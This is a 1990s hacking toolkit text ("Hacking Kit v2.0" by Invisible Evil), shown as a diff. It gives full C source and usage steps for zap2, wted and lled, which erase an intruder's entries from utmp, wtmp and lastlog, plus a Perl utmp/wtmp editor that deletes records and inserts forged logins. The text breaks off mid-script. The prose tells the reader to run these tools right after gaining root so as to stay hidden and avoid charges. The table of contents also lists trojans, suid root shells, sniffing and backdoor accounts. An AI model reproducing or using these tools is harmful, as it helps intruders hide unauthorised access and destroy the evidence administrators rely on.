@@ -1,0 +1,2397 @@
+
+THIS PAPER CONTAINS .C CODE - MAKE SURE TO TURN WORD WRAP OFF! In your editor!!
+AND DO NOT SAVE ANY CHANGES TO THIS FILE IF ASKED....
+
+Unix Utils
+Linux/BSD/SySV/SunOS/IRIX/AIX/HP-UX
+
+Hacking Kit v1.0.c Jan/97
+Hacking Kit v2.0.b March/97  (this is an update)
+
+  By: Invisible Evil
+ IRC: #unixhacking #virus #hackers #virii #hacking #hacker
+      #hack is just to busy for me ;)
+NICK: i-e
+
+If you have any other exploits, bugs, sniffers or utils that are not in here
+please mail them to ii@dormroom.pyro.net. And I will be sure to keep you
+updated with the latest version of this toolkit.
+
+Comments are welcome.  Sys admin's that want to keep their system clean are
+welcome to request the latest version.
+
+If you are looking for perfect grammar or spelling please put this file in
+your circular file.  I put enough time into this and just put it through
+a cheap spell check.
+
+Whats new?  Look for more info on tricks of the trade, and nfs mounting
+drives to gain access to shells.  I am sure you will like the additions.
+I have added a login trojan, in.telnetd trojan, and some more scripts for
+scanning machines for mountable drives.  Have pun!
+
+. . .
+
+Chapter V - Making yourself invisible
+
+       Keeping access
+   5A. Zap2 (for wtmp/lastlog/utmp)
+       Fingering the host before login
+       How to login and stay safe
+       How to configure Zap2
+       Finding the log file locations
+       The zap.c file
+   5B. Other scripts
+       The wted wtmp editor
+       Command line usage for wted
+       How to chmod the wtmp.tmp file
+       How to copy the wtmp.tmp to the wtmp file
+       Setting the path for the wtmp file in wted
+       The wted.c file
+       Cleaning the lastlog file using lled
+       Command line options for lled
+       How to use lled
+       How to chmod the lastlog.tmp file
+       How to copy the lastlog.tmp file to lastlog
+       Setting the path for the lastlog file in lled
+       The lled.c file
+     * A good perl script for editing wtmp, utmp, and, checking processes
+Chapter VI - Cleaning the log files
+
+   6A. A walk around in a hacked system - let's login
+       Logging on the system
+       Watching for admin's
+       Nested directories
+       Having your root file ready
+       Becoming invisible
+       Greping the log directory
+       Cleaning the logs
+       Lets sniff the network
+       Editing your linsniffer.c
+       Looking at the processes running
+       Compiling and naming your sniffer program
+       Starting a sniff session
+       Changing group file access
+       Making a suid root shell trojan for uid=0 gid=0 every time
+       Naming your trojan
+       Touching the files date
+       Checking the sniffer log file
+       Setting the history files to null
+     * Using unset for the history files
+   6B. messages and the syslog
+       How to find the logs are by reading /etc/syslog.conf
+       How to see if there are logs in hidden directories
+       How to see if logs are being mailed to user accounts
+       How to see if logs are going to another machine
+     * How to edit syslog.conf to hide logins
+     * Restarting syslogd
+       How to see if there is a secret su log by reading /etc/login.defs
+   6C. The xferlog
+       How to edit the xferlog
+       How to grep and edit the www logs
+       How to look for ftp logs
+     * Other ways to edit text logs
+     * Using grep -v
+     * A script to rip text lines from these logs
+     * Restarting syslogd
+   6D. The crontabs
+       How to find and read the root or admin's cron
+       How to see if MD5 is setup on the machine
+       What is MD5
+
+Chapter VII - Keeping access to the machine
+
+   7A. Tricks of the trade
+       When the system admin has found you out
+       What to expect from the admin
+       History files
+       Nested directories
+       Placing trojans
+       Hidden directories
+       Making new commands (trojans)
+       Adding or changing passwd file entry's
+       Setting some admin accounts with null passwords
+       The best way to add an account
+       Editing a null account so you can login
+       Installing more games or exploitable programs
+       How to know your admin's
+       Reading system mail (with out updating pointers)
+       What to look for in the mail directories
+       A program to read mail without updating pointers
+   7B. Root kits and trojans
+       What are root kits
+       What are Demon kits
+       What do trojans do
+
+
+*********************************************************
+* Appendix I - Things to do after access                *
+*********************************************************
+  The a-z checklist
+
+. . .
+
+
+--------------------------
+Chapter V
+Making yourself invisible
+--------------------------
+
+The whole point of this hacking stuff is that you continue to have access to as
+many points of information as possible.  If you do stupid things, of fail just
+once to clean your utmp or wtmp, xferlog's, etc ... you can loose access to the
+system.  Make yourself a regular order to follow and learn each system well!
+
+Become part of the system, and take many notes if you are doing many systems
+at once.  But remember make yourself a routine.  Have your set routine of
+taking your time to clean any presence of your login, transfers, etc.  Do NOT fail
+in this one thing or you will loose access and possibly face some sort of
+charges.
+
+----------------------------
+Section 5A
+Zap2 (for wtmp/lastlog/utmp)
+----------------------------
+
+There are different log cleaning programs out there, but the best of these
+is zap2.  I compile mine to be named z2.
+
+z2 will be run right after you get root access.  This will want to be one of
+the fastest things you run.  (you never know)
+
+You might want to do a finger @host.xxx to see who is on now, look at the idle
+time of root or admin accounts to see if they are away doing something.
+
+Login, and as soon as you get on, type w, to see idle time and who is on, but
+at the same time you are looking at that be typing your root access command
+that you should have waiting somewhere nested in the system.  As soon as you
+get your root access, type ./z2 username-u-logged-in-as
+
+Now you are safer then you were.  Do a w or who command to see that you are
+gone from the utmp.  If you ftp, or do other things you might have to use
+other programs I will include in the next section called wted and lled.
+
+Lets finish with this z2 first.  You will have to see where each file is in
+the system and edit z2.c to include the right location of these files
+
+Here is the area you will look for right at the top of the file:
+
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+Most of the systems I login to are:
+
+#define WTMP_NAME "/var/adm/wtmp"
+#define UTMP_NAME "/var/adm/utmp"
+#define LASTLOG_NAME "/var/adm/lastlog"
+
+
+But you do your own look around to see were the files are.  Also /var/log:
+is a regular location.
+
+Add the log locations for each system, compile the file, and you are all ready
+to be invisible right after the login using z2
+
+Here is the .c file
+
+z2.c
+--------------------------- cut here
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+ 
+int f;
+ 
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+ 
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+ 
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+ 
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+ 
+     while(pos != -1L) {
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+          pos = -1L;
+        } else {
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+               write (f, &utmp_ent, sizeof (utmp_ent));
+               pos = -1L;
+          } else pos += 1L;
+        }
+     }
+     close(f);
+  }
+}
+ 
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+ 
+     if ((pwd=getpwnam(who))!=NULL) {
+ 
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+ 
+    } else printf("%s: ?\n",who);
+}
+ 
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+        printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+--------------------------- cut here
+
+---------------
+Section 5B
+Other scripts
+---------------
+
+Now we come to the other part of this.  Lets say that after you login, and do
+your z2, you need to ftp in to grab a file. (remember NEVER ftp or telnet out)
+Ok, you ftp in and grab a few files, or login to another account on the system,
+now you will need to use wted.  wted will let you edit the wtmp to remove your
+login from the ftp.  You also might need to use the lled (lastlog edit).
+
+Here is the menu if you type ./wted, after setting log locations & compile:
+
+[8:25pm][/home/compile]wted
+Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
+            -h      This help
+            -f      Use FILE instead of default
+            -a      Show all entries found
+            -u      Show all entries for USER
+            -b      Show NULL entries
+            -e      Erase USER completely
+            -c      Erase all connections containing HOST
+            -z      Show ZAP'd entries
+            -x      Attempt to remove ZAP'd entries completely
+
+So if i ftp to username tsmith I would type wted -x -e tsmith
+
+The program will now prompt you one login at a time for the user tsmith asking
+if you want to delete it.  After you delete your login, make sure to
+chmod 644 the wtmp.tmp file and then copy it over the top of the wtmp file in
+the log directory.  Like this:
+
+1. chmod 644 wtmp.tmp
+2. cp wtmp.tmp /var/adm/wtmp
+
+Here is your wted program:
+
+MAKE SURE TO HAVE THE RIGHT PATH TO THE char file below
+So make sure you have the right path to the wtmp file.
+
+wted.c
+---------------------- cut here
+#include <stdio.h>
+#include <utmp.h>
+#include <time.h>
+#include <fcntl.h>
+
+char *file="/var/adm/wtmp";
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+int i;
+if (argc==1) usage();
+for(i=1;i<argc;i++)
+	{
+	if(argv[i][0] == '-')
+		{
+		switch(argv[i][1])
+			{
+			case 'b': printents(""); break;
+			case 'z': printents("Z4p"); break;
+			case 'e': erase(argv[i+1],0); break;
+			case 'c': erase(0,argv[i+1]); break;
+			case 'f': file=argv[i+1]; break;
+			case 'u': printents(argv[i+1]); break;
+			case 'a': printents("*"); break;
+			case 'x': remnull(argv[i+1]); break;
+			default:usage();
+			}
+		}
+	}
+}
+
+printents(name)
+char *name;
+{
+struct utmp utmp,*ptr;
+int fp=-1;
+ptr=&utmp;
+if (fp=open(file,O_RDONLY))
+	{
+	while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp))
+		{
+		if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
+		(!(strcmp("Z4p",name)) && (ptr->ut_time==0)))
+			printinfo(ptr);
+		}
+	close(fp);
+	}
+}
+
+printinfo(ptr)
+struct utmp *ptr;
+{
+char tmpstr[256];
+printf("%s\t",ptr->ut_name);
+printf("%s\t",ptr->ut_line);
+strcpy(tmpstr,ctime(&(ptr->ut_time)));
+tmpstr[strlen(tmpstr)-1]='\0';
+printf("%s\t",tmpstr);
+printf("%s\n",ptr->ut_host);
+}
+
+erase(name,host)
+char *name,*host;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct utmp utmp;
+unsigned char c;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
+		if (host)
+			if (strstr(utmp.ut_host,host)) tot++;
+			else {cnt++;write(fd,&utmp,sizeof(struct utmp));}
+		if (name) {
+                if (strcmp(utmp.ut_name,name)) {cnt++;
+			write(fd,&utmp,sizeof(struct utmp));}
+		else { 
+			if (n>0) {
+				n--;cnt++;
+				write(fd,&utmp,sizeof(struct utmp));}
+			else
+			{
+			printinfo(&utmp);
+			printf("Erase entry (y/n/f(astforward))? ");
+			c='a';
+			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
+			if (c=='f') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct utmp));
+				printf("Fast forward how many entries? ");
+				scanf("%d",&n);}
+			if (c=='n') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct utmp));
+				}
+			if (c=='y') tot++;
+			} 
+		      }	}					
+        }
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
+}
+
+remnull(name)
+char *name;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct utmp utmp;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
+		if (utmp.ut_time) {
+			cnt++;
+			write(fd,&utmp,sizeof(struct utmp));
+		}
+		else
+			tot++;
+	}
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
+}
+
+usage()
+{
+printf("Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
+printf("\t-h\tThis help\n");
+printf("\t-f\tUse FILE instead of default\n");
+printf("\t-a\tShow all entries found\n");
+printf("\t-u\tShow all entries for USER\n");
+printf("\t-b\tShow NULL entries\n"); 
+printf("\t-e\tErase USER completely\n");
+printf("\t-c\tErase all connections containing HOST\n");
+printf("\t-z\tShow ZAP'd entries\n");
+printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
+}
+---------------------- cut here
+
+You might also have to clean stuff out of the file /vat/adm/lastlog
+
+For this use the lled.c.  Compile the program and name it lled.
+
+Here is a menu from the program when you type ./lled
+
+[4:04am][/home/paris/compile]lled
+Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
+-h      This help
+-f      Use FILE instead of default
+-a      Show all entries found
+-u      Show all entries for USER
+-b      Show NULL entries
+-e      Erase USER completely
+-c      Erase all connections containing HOST
+-z      Show ZAP'd entries
+-x      Attempt to remove ZAP'd entries completely
+
+It would be good to try to view first using -u, but many times it will not
+show your username in the lastlog, but it will still have your host, so I
+have found that if you know what to look for you can just type something like:
+If my host name that I was coming from was machine.edit.com, I could type
+
+lled -e username -c machine.edit
+
+If you need to view the lastlog your host entry should be at the end of the
+file, just type: lled -a
+
+chmod the file lastlog.tmp 644 and copy the file over the top of the lastlog
+file in the log directory just like you did above for the wted.
+
+BE SURE TO SET THE PATH FOR YOUR lastlog below!
+
+Ok here is your lled.c
+-------------------------- cut here
+#include <stdio.h>
+#include <time.h>
+#include <lastlog.h>
+#include <fcntl.h>
+
+char *file="/var/adm/lastlog";
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+int i;
+if (argc==1) usage();
+for(i=1;i<argc;i++)
+	{
+	if(argv[i][0] == '-')
+		{
+		switch(argv[i][1])
+			{
+			case 'b': printents(""); break;
+			case 'z': printents("Z4p"); break;
+			case 'e': erase(argv[i+1]); break;
+                        case 'c': erase(0,argv[i+1]); break;
+			case 'f': file=argv[i+1]; break;
+			case 'u': printents(argv[i+1]); break;
+			case 'a': printents("*"); break;
+			case 'x': remnull(argv[i+1]); break;
+			default:usage();
+			}
+		}
+	}
+}
+
+printents(name)
+char *name;
+{
+struct lastlog utmp,*ptr;
+int fp=-1;
+ptr=&utmp;
+if (fp=open(file,O_RDONLY))
+	{
+	while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog))
+		{
+		if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
+		(!(strcmp("Z4p",name)) && (ptr->ll_time==0)))
+			printinfo(ptr);
+		}
+	close(fp);
+	}
+}
+
+printinfo(ptr)
+struct lastlog *ptr;
+{
+char tmpstr[256];
+printf("%s\t",ptr->ll_line);
+strcpy(tmpstr,ctime(&(ptr->ll_time)));
+tmpstr[strlen(tmpstr)-1]='\0';
+printf("%s\t",tmpstr);
+printf("%s\n",ptr->ll_host);
+}
+
+erase(name,host)
+char *name,*host;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct lastlog utmp;
+unsigned char c;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
+                if (host)
+                        if (strstr(utmp.ll_host,host)) tot++;
+                        else {cnt++;write(fd,&utmp,sizeof(struct lastlog));}
+                if (name) {
+		if (strcmp(utmp.ll_line,name)) {cnt++;
+			write(fd,&utmp,sizeof(struct lastlog));}
+		else { 
+			if (n>0) {
+				n--;cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));}
+			else
+			{
+			printinfo(&utmp);
+			printf("Erase entry (y/n/f(astforward))? ");
+			c='a';
+			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
+			if (c=='f') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));
+				printf("Fast forward how many entries? ");
+				scanf("%d",&n);}
+			if (c=='n') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));
+				}
+			if (c=='y') tot++;
+			} 
+		      }	}					
+        }
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
+}
+
+remnull(name)
+char *name;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct lastlog utmp;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
+		if (utmp.ll_time) {
+			cnt++;
+			write(fd,&utmp,sizeof(struct lastlog));
+		}
+		else
+			tot++;
+	}
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
+}
+
+usage()
+{
+printf("Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
+printf("\t-h\tThis help\n");
+printf("\t-f\tUse FILE instead of default\n");
+printf("\t-a\tShow all entries found\n");
+printf("\t-u\tShow all entries for USER\n");
+printf("\t-b\tShow NULL entries\n"); 
+printf("\t-e\tErase USER completely\n");
+printf("\t-c\tErase all connections containing HOST\n");
+printf("\t-z\tShow ZAP'd entries\n");
+printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
+}
+---------------------------------------------------------------- cut here
+
+A good perl script for editing utmp, wtmp, and checking processes.
+It will also let you insert lines in wtmp.  So if you need to play you
+can add clinton.whitehouse.gov logging into port ttyp3 and show he stayed
+on the system for a few hours!
+
+Running 'check' will let you know if someone is on the system and not showing
+up in the utmp log.  Admins like to hide the fact that they are online
+sometimes.  This will allow you to see their connection.  You must be root to
+run the script, and they need perl 5.003+ on thier system.  After starting
+the script just type help.
+
+Here are some of the basic commands:
+
+starts by loading wtmp
+
+delete user username
+delete host hostanme
+write
+
+read wtmp
+delete user username
+delete host hostname
+write
+
+do help for the rest ... the best wtmp,wtmp editor around!
+
+Say thankyou i-e ;)
+
+-----------------------start of utmpman.pl
+#!/usr/bin/perl -w
+#
+# Variable defines.
+my($utmp_location) = "/var/run/utmp";
+my($wtmp_location) = "/var/log/wtmp";
+my($shells_location) = "/etc/shells";
+my($ttybase) = "tty";
+my($ttyrange) = "pqrs";                 # TTYrange standard on most linux systems.
+my($ttyports) = "012345657689abcfef";   # TTYports standard on most linux systems.
+
+# Global initializations.
+my($active_file) = "";
+my(%entries) = {};
+my(@cmdline) = ();
+my(@shells) = ();
+
+# Display banner.
+print "\nutmp Manager v0.8\n\n";
+
+# Access check.
+die("utmpman :: You must be root to run this application!\n") unless ($> == 0);
+
+# Read in valid shells.
+if (defined($shells_location)) {
+  open(SHELLFILE, "<$shells_location");
+  @shells = <SHELLFILE>;
+  close(SHELLFILE);
+}
+# Process "basename" of each shell.
+@shells = map( { /([^\/\n]+)\n*$/; $1; } @shells);
+                                 
+print push(@shells) . " valid shells in $shells_location: @shells\n" if (defined(@shells));
+readfile("$utmp_location");
+print("\nutmpman: $active_file> ");
+while (<STDIN>) {
+  process_cmd(split);
+  print("\nutmpman: $active_file> ");
+}
+
+sub process_cmd {
+  return if (!defined(@_));
+  my(@line) = map { lc($_) } @_;
+  
+  $_ = shift(@line);
+  SWITCH: {
+        /^check$/     && do {
+                           check_func(@line);
+                           last SWITCH;
+                         };
+
+        /^delete$/    && do {
+                           del_func(@line);
+                           last SWITCH;
+                         };  
+                         
+        /^help$/      && do {
+                           help_func();
+                           last SWITCH;          
+                         };
+                                      
+        /^insert$/    && do {
+                           ins_func(@line);
+                           last SWITCH;
+                         }; 
+                                      
+        /^list$/      && do {
+                           list_func(@line);
+                           last SWITCH;
+                         };
+
+        /^read$/      && do {
+                           read_func(@line);
+                           last SWITCH;
+                         };
+                                                                                              
+        /^write$/     && do {
+                           write_func(@line);
+                           last SWITCH;
+                         };              
+                                                    
+        /^quit|exit$/ && exit(0);
+        
+        # DEFAULT. 
+        print ("Invalid command.\n");       
+  }
+}
+
+
+# HELP
+
+sub help_func {
+  print << "EOM";
+
+utmpManager Help
+----------------
+
+Note: - <n> is an argument.
+      - [id=] is a token which expects a value as part of command
+        (ie, insert id=p5 user=root 11/23/96). See the insert command.
+      - A line is the full name to the tty port, ie ttyp0.
+      - An id is the *unique* representation of the port
+        (without the tty, etc), ie "p0" (for ttyp0).
+
+  check
+    - Perform user consistancy check. Use this to make sure that the data in
+      utmp agrees with who is actually on the machine. This is useful in
+      determining if a user is online with hidden ports, running nohup'd
+      processes, or running iScreen.
+
+  delete <x>-<y>
+    - Delete entries #x to #y.
+
+  delete host <host>
+    - Delete *all* entries which match the substring <host>.
+
+  delete line|id <line|id>
+    - Delete entry containing <line> or <id>.
+
+  insert {id=|line=} [type=] [user=] [host=] [ConnTime] {LogoffTime}
+    - Insert an entry into utmp/wtmp files specifying any combination
+      of id/line, type, username, host, connection time, and logoff time.
+      (LogoffTime only valid for WTMP files.)
+
+  list host <host>
+    - List all entries matching the substring <host>.
+
+  list line|id <line|id>
+    - List all entries matching <line> or <id>.
+
+  read utmp|wtmp|<filename>
+    - Read entries from either default wtmp, default utmp, or an arbitrary
+      filename. Note: arbitrary filenames MUST start with either "utmp" or
+      "wtmp" to be used with this editor. Rename files *outside* of this
+      editor if necessary. If read is executed without any arguments, it
+      rereads the last given filename, which is displayed on the prompt.
+
+  write {filename}
+    - Write entries to file {filename}. If write is executed without any
+      arguments, then entries will be written to the last given filename,
+      which is displayed on the prompt.
+
+EOM
+}
+
+# DELETE
+
+sub del_func {
+  my(@params) = @_;
+
+  if (!push(@_)) {
+    print("delete :: Not enough parameters. See \"help\" for syntax.\n");
+    return undef;
+  } elsif ($params[0] =~ /host|user|id|line/) {
+    del_by_data(@_);
+  } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
+    del_by_range($params[0]);
+  } elsif ($params[0] =~ m/^(\d+)$/) {
+    del_by_range("$1-$1");
+  }
+  
+  # Renumber list after delete operation.
+  resync();
+}
+
+
+sub del_by_range {
+  my($range)=shift;
+  $range =~ m/(\d+)*-(\d+)*/;
+  my($lo, $hi, $count)=($1, $2, 0);
+  
+  $lo = 0 if (!defined($lo));
+  $hi = scalar(keys(%entries)) if (!defined($hi));
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (($_ >= $lo) && ($_ <= $hi)) {
+      delete($entries{$_});
+      $count++;
+    }
+  }
+  print "$count entries deleted.\n";
+}               
+
+
+sub del_by_data {
+  my($op, $data) = @_;
+  my($count) = 0;
+
+  if ((length($data) < 5) && ($op eq "host")) {
+    print "Must specify at least 5 characters for delete hostmask.\n";
+    return undef;
+  } elsif (((length($data) > 4) && ($op eq "id"))||
+           ((length($data) > 11) && ($op eq "line"))) {
+    print "Invalid $op specified.\n";
+    return undef;
+  }
+  # Note: If we are deleting by user, then user must match, *exactly*!
+  $data = "^" . pack("a8", $data) . "\$" if ($op eq "user");
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (%{$entries{$_}}->{$op} =~ m/$data/i) {
+      delete($entries{$_});
+      ++$count;
+    }
+  }
+  if (!$count) {
+    print "No $op entries matching $data.\n";
+  } else {
+    print "$count entries deleted.\n";
+  }
+}
+
+
+# INSERT
+
+# Date1 Time1 = DateTime1 => mm/dd/[cc]yy[:hh:mm[:ss]]
+# Date2 Time2 = DateTime2 => (see above)
+# user=<username>
+# host=<hostname>
+# id=<id> | line=<line>
+#
+# utmp:
+# insert {id=|line=} [type=] [user=] [host=] [DateTime]
+# wtmp:
+# insert {id=|line=} [user=] [host=] [DateTime1] {DateTime2}
+
+sub ins_func {
+  my(%cmdopt)={};
+  my($datetime1, $datetime2, $gmdate, $gmdate2);
+
+  # Get random pid out of the way.
+  $cmdopt{"pid"} = int(rand(32656)+100);
+  $cmdopt{"addr"} = pack("a4", "");
+
+  # Get command options.
+  foreach (@_) {
+    if (/=/) {
+      local($key, $value)=split(/=/);
+      $cmdopt{$key} = $value;
+    } else {
+      if (!defined($datetime1)) {
+        $datetime1 = $_;
+        next;
+      }
+      if (!defined($datetime2)) {
+        $datetime2 = $_ ;
+        next;
+      }
+      print "insert :: Invalid options specified. Please see \"help\" for syntax.\n";
+      return undef;
+    }
+  }
+
+  # Check for an illegal pair or illegal option.
+  foreach (keys(%cmdopt)) {
+    if (!(/^host|id|line|type|user|addr$/)) {
+      print "insert :: Invalid options specified. Please see \"help\" for syntax.\n";
+      return undef;
+    }
+    if (($_ eq "last") && ($active_file !~  m!/*utmp[^/]*$!i)) {
+      print "insert :: LAST option only valid for utmp files.\n";
+      return undef;
+    }     
+  }
+
+  # Get date in seconds since 1970.
+  $gmdate = SecsSince1970($datetime1);
+
+  # Get ending date in seconds since 1970.
+  $gmdate2 = SecsSince1970($datetime2) if (defined($datetime2));
+
+  if (!defined($gmdate) || (!defined($gmdate2) && defined($datetime2))) {
+    print "insert :: Invalid date specified.\n";
+    return undef;
+  }
+
+  if (defined($gmdate2)) {
+    if ($gmdate2 < $gmdate) {
+      print "insert :: First date/time must be *later* than second date/time.\n";
+      return undef;
+    }
+  }
+
+  if (defined($cmdopt{"id"}) && defined($cmdopt{"line"})) {
+    print "insert :: Insert by LINE or ID only. Please do not specify both.\n";
+    return undef;
+  }
+
+  my($op);
+
+  if (!defined($cmdopt{"id"})) {
+    $cmdopt{"id"} = $cmdopt{"line"};
+    $op = "line";
+    if (!($cmdopt{"id"} =~ s/^$ttybase//)) { 
+      print "insert :: Invalid line specified.\n"; 
+      return undef; 
+    }
+  } else {
+    $cmdopt{"line"} = $ttybase . $cmdopt{"id"};
+    $op = "id";
+  } 
+
+  if (!(defined($cmdopt{"line"}) || defined($cmdopt{"id"}))) {
+    print "insert :: Neither LINE nor ID value found. See \"help\" for syntax.\n";
+    return undef;
+  }
+    
+  my($searchdata) = ($active_file =~ m!/*utmp[^/]*$!i) ?  
+    (pack(($op eq "line") ? "a12" : "a4", $cmdopt{$op})):$cmdopt{$op};
+  my($epos1, $npos1, $epos2, $npos2) = ();
+  my($oldpos, $count)=("", 0);
+
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if ($active_file =~ m!/*utmp[^/]*$!i) {
+      # Handle utmp insertion by line insertion.
+      if (%{$entries{$_}}->{$op} eq $searchdata) {
+        printf ("insert :: $op $searchdata already exists at position $_\n");
+        # This needs to check every option in %cmdopt for defined or null.
+        $count = 0;
+        foreach (qw(user host time)) {
+          if (defined($cmdopt{$_})) {
+            $count++ if ($cmdopt{$_} ne "");
+          }
+        }
+        if (!$count) {
+          printf ("insert :: No other data specified. Entry unchanged.\n");
+          return undef;
+        }
+        last;
+      }
+    } else {
+      # Handle wtmp insertion by time position. (Messy)
+      $epos1 = $oldpos if (defined($npos1) && !defined($epos1));
+      $npos1 = $_ if (%{$entries{$_}}->{"time"} > $gmdate);
+      last if (!defined($gmdate2) && defined($epos1));
+      $epos2 = $oldpos if (defined($npos2)); 
+      $npos2 = $_ if (%{$entries{$_}}->{"time"} > $gmtime2);
+      last if (defined($epos2));
+    }
+    $oldpos = $_;
+  }
+
+  # Set any unspecified defaults.
+  $cmdopt{"user"} = pack("a8", "")  if !defined($cmdopt{"user"});
+  $cmdopt{"host"} = pack("a16", "") if !defined($cmdopt{"host"});
+  $cmdopt{"type"} = 7               if !defined($cmdopt{"type"});
+
+  # Determine end of list insertion positions. (IE, dates entered are after
+  # dates in wtmp file or line/id not found in utmp file.
+  $epos1 = (scalar(keys(%entries)) + 1) if (!defined($npos1));
+  if (defined($datetime2)) {
+    $epos2 = (scalar(keys(%entries)) + 1) if (!defined($npos2));
+    ++$epos2 if (defined($gmtime2) && !defined($npos1));
+  }
+
+  # Parse insert data and insert entry.
+  $epos1 = sprintf("%7.3f", ($npos1 - $epos1)/2) if (defined($npos1));
+  $epos2 = sprintf("%7.3f", ($npos2 - $epos2)/2)
+    if (defined($npos2) && defined($gmdate2));
+
+  # Insert first entry.
+  $cmdopt{"time"} = $gmdate;  
+  @{$entries{$epos1}}{qw(type pid line id time user host addr)} = 
+           @{%cmdopt}{qw(type pid line id time user host addr)};
+
+  if (defined($epos2)) {
+    $cmdopt{"user"} = pack("a8", "");
+    $cmdopt{"host"} = pack("a16","");
+    $cmdopt{"id"}   = pack("a4", "");
+    $cmdopt{"time"} = $gmdate2;
+ 
+    @{$entries{$epos2}}{qw(type pid line id time user host addr)} =
+             @{%cmdopt}{qw(type pid line id time user host addr)};
+  }
+
+  resync();
+}
+
+
+# LIST
+
+sub list_func {
+  my(@params) = @_;
+
+  if (!push(@_) || ($params[0] eq "all")) {
+    list_by_range("-");
+    return 0;
+  } elsif ($params[0] =~ /^host|user|id|line$/) {
+    list_by_data(@_);
+    return 0;
+  } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
+    list_by_range($params[0]);
+    return 0;
+  } elsif ($params[0] =~ m/^(\d+)$/) {
+    list_by_range("$1-$1");
+    return 0;
+  }
+                          
+  print ("list :: Error in parameters. See \"help\" for syntax.\n");
+  return undef;
+}    
+
+
+sub list_by_data {
+  my($op, $data) = @_;
+  my($count) = 0;
+
+  foreach (sort( {$a <=> $b} keys(%entries))) {
+    if (%{$entries{$_}}->{$op} =~ m/$data/i) {
+      list_entry($_);
+      ++$count;
+    }
+  }
+  print "No $op entries matching $data.\n" if (!$count);
+}
+
+
